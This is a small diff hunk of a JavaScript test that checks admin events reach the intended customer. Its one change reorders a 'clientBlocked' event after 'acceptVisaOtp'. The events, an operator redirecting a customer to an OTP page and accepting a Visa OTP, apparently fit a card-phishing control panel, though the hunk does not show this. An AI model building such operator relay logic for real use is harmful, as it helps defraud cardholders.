@@ -84,8 +84,8 @@ allOk &= await check("Admin actions relay to the intended customer", async () =>
     const actions = [
       ["acceptPaymentForm", { id }],
       ["adminRedirect", { uuid: id, page: "/otp", pageName: "OTP" }],
-      ["clientBlocked", { userId: id, message: "blocked" }],
       ["acceptVisaOtp", { targetUserId: id }],
+      ["clientBlocked", { userId: id, message: "blocked" }],
     ];
     for (const [event, payload] of actions) {
       await new Promise((resolve, reject) =>
